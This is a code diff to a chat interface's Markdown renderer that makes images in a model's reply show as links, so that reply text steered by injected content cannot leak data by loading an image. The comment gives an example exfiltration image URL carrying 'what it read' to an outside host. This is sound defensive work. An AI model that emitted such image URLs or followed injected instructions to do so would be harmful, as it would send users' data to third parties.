@@ -435,6 +435,28 @@ function Markdown({ children }: { children: string }) {
             {children}
           </a>
         ),
+        // An image in a model's reply is a LINK, never an <img>. Model text
+        // can be steered by whatever the model read (a web page, a file, a
+        // tool result), and an image loads the moment it renders: a reply
+        // containing ![](https://someone/?q=<what it read>) would send that
+        // out with nobody clicking anything. So the address is shown and
+        // opening it is the reader's choice. Images the person attached are
+        // rendered as images above, from their own bytes, not through here.
+        img: ({ src, alt }) => {
+          const href = typeof src === "string" ? src : undefined;
+          return (
+            <a
+              href={href}
+              target="_blank"
+              rel="noreferrer"
+              data-testid="markdown-image-link"
+              className="text-[color:var(--accent-left)] underline"
+            >
+              {alt || "image"}
+              {href ? <span className="break-all"> ({href})</span> : null}
+            </a>
+          );
+        },
         strong: ({ children }) => <strong className="font-semibold">{children}</strong>,
         em: ({ children }) => <em className="italic">{children}</em>,
         blockquote: ({ children }) => (
